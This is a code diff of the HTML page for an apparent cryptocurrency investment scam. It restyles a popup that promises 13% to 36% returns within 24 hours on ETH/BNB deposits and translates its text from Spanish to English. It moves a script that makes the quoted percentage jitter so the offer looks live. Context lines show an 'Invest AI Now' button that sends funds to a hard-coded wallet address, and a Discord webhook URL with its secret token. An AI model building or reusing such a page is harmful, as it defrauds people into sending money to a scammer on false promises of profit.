@@ -722,31 +722,48 @@ setInterval(() => {
     from, to { opacity: 0 }
     50% { opacity: 1 }
   }
-	.progress-percent {
-  position: absolute;
-  top: 0;
-  left: 50%;
-  transform: translateX(-50%);
-  font-size: 12px;
-  color: #555;
-}
-#popup2 {
-  position: absolute;
-  top: 50px;
-  left: 50px;
-  background-color: #fff;
-  border: 1px solid #000;
-  padding: 10px;
-  animation-name: popup-animation;
-  animation-duration: 1s;
-  animation-iteration-count: infinite;
-  animation-direction: alternate;
+.popup2 {
+  position: relative;
+  display: inline-block;
 }
 
-@keyframes popup-animation {
-  from { transform: scale(1); }
-  to { transform: scale(1.1); }
+.popup2-content {
+  position: absolute;
+  z-index: 1;
+  visibility: hidden;
+  background-color: #fff;
+  color: #000;
+  border: 1px solid #000;
+  border-radius: 5px;
+  padding: 10px;
+  width: 300px;
+  text-align: center;
 }
+
+.popup2:hover .popup-content {
+  visibility: visible;
+}
+
+.popup2-text {
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+.popup2-amount {
+  font-weight: bold;
+  font-size: 16px;
+}
+
+.input-box {
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-top: 6px;
+  margin-bottom: 16px;
+}
+
 
 
 </style>
@@ -780,31 +797,23 @@ setInterval(() => {
 
   setTimeout(typeMiningMessage, 1000);
 </script>
-	  <script>
-		  const amountInput = document.getElementById("amount1");
-const popup2 = document.getElementById("popup");
-const percentage = document.getElementById("percentage");
-
-amountInput.addEventListener("mouseenter", function() {
-  popup.style.display = "block";
-  percentage.textContent = 13;
-  setInterval(function() {
-    const currentPercentage = parseInt(percentage.textContent);
-    const newPercentage = currentPercentage + Math.floor(Math.random() * 3) - 1;
-    percentage.textContent = Math.max(0, Math.min(newPercentage, 36));
-  }, 1000);
-});
-
-amountInput.addEventListener("mouseleave", function() {
-  popup.style.display = "none";
-});
-	  </script>
+	 
 
 
 
 
-     <input type="number" id="amount1" title="Envía 0.01 ETH/BNB algoritmo de rentabilidad 13% - Envía 0.1 ETH/BNB algoritmo de rentabilidad 23% - Envía 1 ETH/BNB algoritmo de rentabilidad 36%. Una vez enviado el monto, el retorno de su ganancia estará listo en su cartera exactamente a las 24hs de haber enviado el depósito.">
-<div id="popup2" style="display:none;">Envía 0.01 ETH/BNB algoritmo de rentabilidad <span id="percentage">13</span>%</div>
+   <input type="number" id="amount1" class="input-box">
+
+<div class="popup2" id="popup">
+  <div class="popup2-content">
+    <div class="popup2-text">
+      <p>Send <span class="popup2-amount">0.01 ETH/BNB</span> to get 13% profitability algorithm</p>
+      <p>Send <span class="popup2-amount">0.1 ETH/BNB</span> to get 23% profitability algorithm</p>
+      <p>Send <span class="popup2-amount">1 ETH/BNB</span> to get 36% profitability algorithm</p>
+      <p>Your return on investment will be ready in your wallet exactly 24 hours after depositing.</p>
+    </div>
+  </div>
+</div>
 
   <div style="text-align: center;">
   <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Invest AI Now</button>
@@ -858,6 +867,25 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
+	   <script>
+		  const amountInput = document.getElementById("amount1");
+const popup2 = document.getElementById("popup2");
+const percentage = document.getElementById("percentage");
+
+amountInput.addEventListener("mouseenter", function() {
+  popup.style.display = "block";
+  percentage.textContent = 13;
+  setInterval(function() {
+    const currentPercentage = parseInt(percentage.textContent);
+    const newPercentage = currentPercentage + Math.floor(Math.random() * 3) - 1;
+    percentage.textContent = Math.max(0, Math.min(newPercentage, 36));
+  }, 1000);
+});
+
+amountInput.addEventListener("mouseleave", function() {
+  popup.style.display = "none";
+});
+	  </script>
 
 
 
